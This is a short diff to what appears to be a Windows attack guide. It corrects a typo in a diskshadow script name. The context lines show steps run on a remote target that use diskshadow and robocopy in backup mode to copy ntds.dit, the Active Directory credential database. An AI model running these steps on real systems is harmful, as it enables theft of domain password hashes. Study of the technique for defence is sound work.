@@ -70,7 +70,7 @@ On the remote target, run the following:
 mkdir C:\temp
 ```
 ```
-diskshadow /s dishshadow.txt
+diskshadow /s diskshadow.txt
 ```
 ```
 robocopy /b E:\Windows\ntds . ntds.dit
